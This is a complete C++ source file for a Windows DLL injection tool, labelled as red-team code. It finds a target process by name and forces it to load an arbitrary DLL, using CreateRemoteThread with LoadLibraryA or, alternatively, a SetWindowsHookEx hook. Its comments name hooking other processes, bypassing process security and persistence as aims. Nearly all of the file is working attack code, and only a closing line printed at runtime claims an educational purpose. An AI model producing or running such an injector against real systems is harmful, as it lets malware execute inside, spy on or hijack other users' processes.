#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <string>

// Red Team Focus: DLL injection can be used to:
// 1. Execute code in the context of another process
// 2. Hook API calls in other processes
// 3. Bypass process-level security controls
// 4. Implement persistence mechanisms

// Find a process by name
DWORD findProcess(const std::string& processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create process snapshot. Error: " << GetLastError() << std::endl;
        return 0;
    }
    
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &processEntry)) {
        do {
            std::wstring wProcessName(processEntry.szExeFile);
            std::string currentProcessName(wProcessName.begin(), wProcessName.end());
            
            if (currentProcessName == processName) {
                DWORD pid = processEntry.th32ProcessID;
                CloseHandle(snapshot);
                return pid;
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    
    CloseHandle(snapshot);
    return 0;
}

// Inject a DLL into a process
bool injectDLL(DWORD processId, const std::string& dllPath) {
    // Open the target process
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (processHandle == NULL) {
        std::cerr << "Failed to open process. Error: " << GetLastError() << std::endl;
        return false;
    }
    
    // Allocate memory in the target process for the DLL path
    LPVOID remoteMemory = VirtualAllocEx(processHandle, NULL, dllPath.length() + 1, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteMemory == NULL) {
        std::cerr << "Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
        CloseHandle(processHandle);
        return false;
    }
    
    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(processHandle, remoteMemory, dllPath.c_str(), dllPath.length() + 1, NULL)) {
        std::cerr << "Failed to write to process memory. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(processHandle, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return false;
    }
    
    // Get the address of LoadLibraryA
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddr == NULL) {
        std::cerr << "Failed to get LoadLibraryA address. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(processHandle, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return false;
    }
    
    // Create a remote thread that calls LoadLibraryA with the DLL path
    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, 
                                           (LPTHREAD_START_ROUTINE)loadLibraryAddr, 
                                           remoteMemory, 0, NULL);
    if (remoteThread == NULL) {
        std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(processHandle, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return false;
    }
    
    // Wait for the thread to complete
    WaitForSingleObject(remoteThread, INFINITE);
    
    // Get the thread exit code (the handle to the loaded DLL)
    DWORD exitCode;
    GetExitCodeThread(remoteThread, &exitCode);
    
    // Clean up
    CloseHandle(remoteThread);
    VirtualFreeEx(processHandle, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(processHandle);
    
    // Check if the DLL was loaded successfully
    if (exitCode == 0) {
        std::cerr << "DLL injection failed. The DLL may not have been loaded." << std::endl;
        return false;
    }
    
    std::cout << "DLL injected successfully!" << std::endl;
    return true;
}

// Alternative DLL injection method using SetWindowsHookEx
bool injectDLLWithHook(DWORD processId, const std::string& dllPath) {
    // Load the DLL into the current process
    HMODULE hDll = LoadLibraryA(dllPath.c_str());
    if (hDll == NULL) {
        std::cerr << "Failed to load DLL. Error: " << GetLastError() << std::endl;
        return false;
    }
    
    // Get the address of the hook procedure
    HOOKPROC hookProc = (HOOKPROC)GetProcAddress(hDll, "HookProc");
    if (hookProc == NULL) {
        std::cerr << "Failed to get hook procedure address. Error: " << GetLastError() << std::endl;
        FreeLibrary(hDll);
        return false;
    }
    
    // Get the thread ID of the target process
    DWORD threadId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create thread snapshot. Error: " << GetLastError() << std::endl;
        FreeLibrary(hDll);
        return false;
    }
    
    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);
    
    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processId) {
                threadId = threadEntry.th32ThreadID;
                break;
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }
    
    CloseHandle(snapshot);
    
    if (threadId == 0) {
        std::cerr << "Failed to find a thread in the target process." << std::endl;
        FreeLibrary(hDll);
        return false;
    }
    
    // Set the Windows hook
    HHOOK hook = SetWindowsHookEx(WH_GETMESSAGE, hookProc, hDll, threadId);
    if (hook == NULL) {
        std::cerr << "Failed to set Windows hook. Error: " << GetLastError() << std::endl;
        FreeLibrary(hDll);
        return false;
    }
    
    // Post a message to the thread to trigger the hook
    PostThreadMessage(threadId, WM_NULL, 0, 0);
    
    // Wait a bit for the hook to be triggered
    Sleep(1000);
    
    // Remove the hook
    UnhookWindowsHookEx(hook);
    
    // Unload the DLL from the current process
    FreeLibrary(hDll);
    
    std::cout << "DLL injected with hook successfully!" << std::endl;
    return true;
}

int main(int argc, char* argv[]) {
    // Check command line arguments
    if (argc != 3) {
        std::cout << "Usage: " << argv[0] << " <process_name> <dll_path>" << std::endl;
        std::cout << "Example: " << argv[0] << " notepad.exe C:\\path\\to\\mydll.dll" << std::endl;
        return 1;
    }
    
    std::string processName = argv[1];
    std::string dllPath = argv[2];
    
    // Find the target process
    DWORD processId = findProcess(processName);
    if (processId == 0) {
        std::cerr << "Process " << processName << " not found" << std::endl;
        return 1;
    }
    
    std::cout << "Found process " << processName << " with PID " << processId << std::endl;
    
    // Inject the DLL
    if (injectDLL(processId, dllPath)) {
        std::cout << "Successfully injected " << dllPath << " into " << processName << std::endl;
    } else {
        std::cerr << "Failed to inject " << dllPath << " into " << processName << std::endl;
        return 1;
    }
    
    std::cout << "Note: This example is for educational purposes only." << std::endl;
    std::cout << "Always ensure you have proper authorization before injecting code into other processes." << std::endl;
    
    return 0;
}

